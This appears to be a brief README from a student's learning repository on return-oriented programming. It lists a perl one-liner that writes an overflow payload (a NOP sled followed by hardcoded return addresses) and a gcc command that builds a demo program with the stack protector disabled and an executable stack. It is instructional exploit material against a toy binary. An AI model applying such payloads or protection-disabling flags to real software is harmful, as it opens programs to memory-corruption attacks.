# README

These files are for learning purposes only.

* "shell_ROP" is shellcode I generated with: 
  * perl -e ' print "\x90"x16; print "\x18\xf4\xff\xbf"; print "\x98\x84\x04\x08"; print "\xEF\xBE\xAD\xDE"; print "\x96\x84\x04\x08"; ' > shell_ROP 

* "myecho.c" is code I wrote to demonstrate the concept of ROP simply
  * gcc -g -fno-stack-protector -z execstack myecho.c  -o myecho

